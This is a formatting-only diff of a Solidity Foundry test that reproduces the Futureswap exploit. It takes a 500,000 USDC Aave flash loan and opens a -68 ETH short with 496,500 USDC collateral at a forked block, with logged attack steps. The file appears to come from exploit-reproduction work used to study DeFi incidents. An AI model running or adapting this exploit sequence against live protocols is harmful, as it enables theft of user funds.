@@ -47,12 +47,11 @@ contract AuxiliaryPosition {
 // ============================================
 
 contract Exploit_Futureswap is Test, TokenBalanceTracker, IFlashLoanSimpleReceiver {
-
     address constant ATTACKER = 0xbF6EC059F519B668a309e1b6eCb9a8eA62832d95;
 
     // Block number for fork (one block before the attack)
-    uint256 constant ATTACK_BLOCK = 419829770;
-                                    
+    uint256 constant ATTACK_BLOCK = 419_829_770;
+
     // Token addresses
     IERC20 private constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
     IERC20 private constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
@@ -64,10 +63,10 @@ contract Exploit_Futureswap is Test, TokenBalanceTracker, IFlashLoanSimpleReceiv
     IPool private constant AAVE_POOL = IPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
 
     // USDC amounts (6 decimals)
-    uint256 constant USDC_1000 = 1_000_000_000;      // 1,000 USDC
-    uint256 constant USDC_2000 = 2_000_000_000;      // 2,000 USDC
-    uint256 constant USDC_500 = 500_000_000;         // 500 USDC
-    uint256 constant USDC_496500 = 496_500_000_000;  // 496,500 USDC
+    uint256 constant USDC_1000 = 1_000_000_000; // 1,000 USDC
+    uint256 constant USDC_2000 = 2_000_000_000; // 2,000 USDC
+    uint256 constant USDC_500 = 500_000_000; // 500 USDC
+    uint256 constant USDC_496500 = 496_500_000_000; // 496,500 USDC
     uint256 constant FLASHLOAN_AMOUNT = 500_000_000_000; // 500,000 USDC
 
     uint16 constant REFERRAL_CODE = 0;
@@ -115,26 +114,24 @@ contract Exploit_Futureswap is Test, TokenBalanceTracker, IFlashLoanSimpleReceiv
     }
 
     function run() public {
-
         console.log("[1] Requesting flashloan: 500,000 USDC");
 
-        AAVE_POOL.flashLoanSimple(
-            address(this),
-            address(USDC),
-            FLASHLOAN_AMOUNT,
-            "",
-            REFERRAL_CODE
-        );
+        AAVE_POOL.flashLoanSimple(address(this), address(USDC), FLASHLOAN_AMOUNT, "", REFERRAL_CODE);
     }
 
     // Callback function called by Aave after receiving the flashloan
     function executeOperation(
-        address /* asset */,
+        address,
+        /* asset */
         uint256 amount,
         uint256 premium,
         address initiator,
         bytes calldata /* params */
-    ) external override returns (bool) {
+    )
+        external
+        override
+        returns (bool)
+    {
         require(msg.sender == address(AAVE_POOL), "Caller is not Aave Pool");
         require(initiator == address(this), "Initiator is not this contract");
 
@@ -165,9 +162,9 @@ contract Exploit_Futureswap is Test, TokenBalanceTracker, IFlashLoanSimpleReceiv
         console.log("[6] Main contract: Open SHORT -68 ETH with 496,500 USDC collateral");
         USDC.approve(address(FUTURESWAP), USDC_496500);
         FUTURESWAP.changePosition(
-            -68 ether,           // deltaAsset = -68 ETH (short)
+            -68 ether, // deltaAsset = -68 ETH (short)
             int256(USDC_496500), // deltaStable = +496,500 USDC
-            0                    // stableBound
+            0 // stableBound
         );
 
         // Step 6: aux_01 closes position and withdraws profit
